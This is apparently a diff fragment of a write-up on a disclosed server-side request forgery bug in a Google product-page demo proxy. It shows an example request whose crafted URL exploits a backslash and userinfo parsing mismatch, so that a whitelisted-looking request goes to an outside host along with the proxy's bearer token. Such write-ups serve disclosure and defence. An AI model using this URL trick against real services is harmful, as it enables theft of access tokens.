@@ -29,10 +29,10 @@ A product-page demo proxy (`cxl-services.appspot.com`) that forwards requests to
 
 * Example request used:
 
-  ```
+  
   GET /proxy?url=https://sfmnev.vps.xdavidhu.me\@jobs.googleapis.com/ HTTP/1.1
   Host: cxl-services.appspot.com
-  ```
+  
 * The whitelist validator parsed the URL (likely following RFC3986) and treated `sfmnev.vps.xdavidhu.me` as userinfo, leaving `jobs.googleapis.com` as the hostname (thus allowed).
 * The HTTP client (or another parser used when performing the actual outbound request), following WHATWG rules, interpreted the backslash as ending the host authority and treated the host as `sfmnev.vps.xdavidhu.me`. The outbound request therefore went to the attacker server while the proxy still included its `Authorization: Bearer <token>` header. ([bugs.xdavidhu.me][1])
 
